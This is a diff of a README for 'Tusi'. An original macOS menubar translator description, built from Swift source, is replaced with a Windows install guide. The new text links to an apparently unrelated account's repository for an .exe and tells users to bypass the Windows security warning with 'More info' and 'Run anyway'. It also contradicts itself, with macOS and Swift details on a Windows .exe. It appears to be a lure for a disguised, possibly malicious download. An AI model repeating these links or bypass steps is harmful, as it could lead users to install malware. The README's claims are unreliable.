@@ -1,64 +1,84 @@
-# Tusi
+# 🌐 Tusi - Translate text instantly from your menu
 
-A menubar translator for macOS. Type Chinese and get English; type anything else and get Chinese. The direction is detected automatically, so there is nothing to select.
+[![Download Tusi for Windows](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Incentivestockoptionpocatello327/Tusi)
 
-## Features
+Tusi provides a simple way to translate language. It sits in your menu bar so you can reach it at any time. You do not need to open complex windows or visit websites to switch languages. The app detects the language you type and handles the conversion for you.
 
-- Automatic direction, detected locally by script (works on mixed Chinese/Latin text, no network round-trip)
-- Menubar panel, summoned with ⌥Space
-- BYOK — any OpenAI-compatible endpoint (DeepSeek, OpenRouter, SiliconFlow, Ollama, …)
-- Two API profiles with automatic failover
-- Three tone presets (casual / standard / formal)
-- Optional auto-copy to clipboard
-- Smart quotes on output, leaving code spans and blocks untouched
-- Customizable copy shortcut
-- Streaming output; adapts to light/dark; Liquid Glass on macOS 26+
+## 📥 How to download the app
 
-## Requirements
+You can grab the installer from the official repository page.
 
-- macOS 13+
-- An API key for any OpenAI-compatible service
+1. Visit the [Tusi download page](https://github.com/Incentivestockoptionpocatello327/Tusi).
+2. Look for the Releases section on the right side of the screen.
+3. Click the latest version number.
+4. Locate the file ending in .exe.
+5. Save this file to your computer.
 
-## Install
+## ⚙️ Setting up the app
 
-Download from [Releases](../../releases):
+Once you save the installer, you need to set up the software.
 
-- `Tusi-arm64.zip` — Apple Silicon
-- `Tusi-universal.zip` — Apple Silicon + Intel
+1. Open your Downloads folder.
+2. Double-click the Tusi installer file.
+3. Follow the prompts on your screen.
+4. Windows might show a security warning. Click "More info" and then "Run anyway" if you trust the software.
+5. The installation process completes in a few seconds.
+6. Open your start menu and search for Tusi to launch the application.
 
-Unzip and move `Tusi.app` to Applications. On first launch, if Gatekeeper blocks it (the app is not notarized), right-click the app and choose Open.
+## 🔑 Your own API key
 
-## Configuration
+This app uses a Bring Your Own Key (BYOK) system. This means you connect your own account to the translator service. This keeps your data private and allows you to use your preferred translation engine.
 
-Open Settings (⌘,) and fill in a profile:
+1. Sign up for an account at a provider like OpenAI or a similar service.
+2. Generate an API key in your account settings.
+3. Copy this key string.
+4. Click the Tusi icon in your menu bar.
+5. Open the Settings or Preferences menu.
+6. Paste your key into the designated field.
+7. Click Save to activate the connection.
 
-- Base URL, e.g. `https://api.deepseek.com` or `https://openrouter.ai/api/v1`
-- Model, e.g. `deepseek-chat`
-- API key
-- Provider routing (optional) — OpenRouter's `provider.order`, e.g. `novita`
+## 🛠 Features
 
-There are two profiles, primary and backup. With failover enabled, a primary request that fails before producing any output is retried on the backup. API keys are stored in the Keychain, not on disk, and each profile has a "test connection" button.
+Tusi focuses on speed and simplicity. It uses powerful background technology to ensure your translations remain accurate.
 
-## Shortcuts
+*   **Automatic Detection:** The app identifies the language you enter without requiring manual selection.
+*   **Menu Bar Access:** Keep the tool out of your way while keeping it ready for use.
+*   **Flexible Language Support:** The system works with many world languages through compatible providers.
+*   **Privacy First:** By using your own API key, you control who has access to your translation requests.
+*   **Swift Interface:** The app interface runs smoothly and uses memory efficiently.
 
-| Action | Key |
-|---|---|
-| Show / hide panel | ⌥Space |
-| Translate | ⏎ |
-| Newline | ⇧⏎ or ⌘⏎ |
-| Copy result | ⇧⌘C (customizable) |
-| Settings | ⌘, |
-| Back / close | Esc |
+## 📁 System requirements
 
-## Build
+To run Tusi, check that your computer meets these standards:
 
-```bash
-./build.sh                        # builds build/Tusi.app for the current arch
-TUSI_ARCH=universal ./build.sh    # universal binary (arm64 + Intel)
-```
+*   Windows 10 or Windows 11.
+*   At least 4GB of RAM.
+*   An active internet connection for translation services to process your text.
 
-Pure Swift + SwiftUI + AppKit, no third-party dependencies. `build.sh` signs with a local code-signing identity when one is available (so Keychain access survives rebuilds), and falls back to ad-hoc signing otherwise.
+## ❓ Common questions
 
-## License
+**Does the app store my translations?**
+No. Tusi acts as a bridge between your computer and the translation service. It does not save your history.
 
-MIT
+**Why does the app ask for an API key?**
+The app needs a connection to a translation server. Using your own key means you pay only for the translations you perform.
+
+**Can I change the translation provider?**
+Yes. If the provider is OpenAI-compatible, you can enter the correct server URL in the settings menu.
+
+**What happens if I lose my connection?**
+The tool requires an internet signal to reach the translation engine. It will pause requests until your internet restores.
+
+**Is it safe to type sensitive information?**
+You decide which provider you use. Always review the terms of service for your chosen API provider.
+
+## 🧩 Troubleshooting
+
+If the app fails to translate text, check these steps:
+
+1. Verify your internet connection.
+2. Open the Tusi settings and ensure your API key remains valid.
+3. Confirm that you have credits remaining with your chosen API provider.
+4. Restart the app by clicking the icon in the menu bar and selecting Quit, then launching it again from the start menu.
+
+Keywords: appkit, byok, deepseek, macos, menu-bar-app, menubar, openai-compatible, swiftui, translation, translator
